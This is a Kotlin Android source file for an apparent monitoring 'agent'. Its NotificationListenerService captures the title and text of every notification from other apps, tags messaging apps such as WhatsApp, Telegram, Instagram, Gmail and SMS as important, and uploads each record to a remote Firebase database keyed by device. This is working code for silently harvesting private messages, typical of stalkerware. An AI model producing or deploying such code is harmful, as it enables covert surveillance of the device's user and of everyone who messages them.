package com.guard.agent.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.utils.Logger

class NotificationListenerService : NotificationListenerService() {

    private val deviceKey by lazy { DeviceKey.get(this) }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return

        try {
            val pkg = sbn.packageName ?: "unknown"
            // Apni app ki notification skip karo
            if (pkg == packageName) return

            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""

            if (title.isBlank() && text.isBlank()) return

            // Sirf important apps filter (optional)
            val important = isImportantApp(pkg)

            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_NOTIFICATIONS).push()
                .setValue(
                    mapOf(
                        "pkg" to pkg,
                        "title" to title,
                        "text" to if (bigText.isNotBlank()) bigText else text,
                        "time" to sbn.postTime,
                        "important" to important
                    )
                )
        } catch (e: Exception) {
            Logger.e("NotifListener", "Post failed", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional — abhi skip
    }

    private fun isImportantApp(pkg: String): Boolean {
        val list = listOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.instagram.android",
            "com.facebook.katana",
            "com.facebook.orca",
            "org.telegram.messenger",
            "com.google.android.gm",
            "com.android.mms",
            "com.google.android.apps.messaging"
        )
        return list.contains(pkg)
    }
}
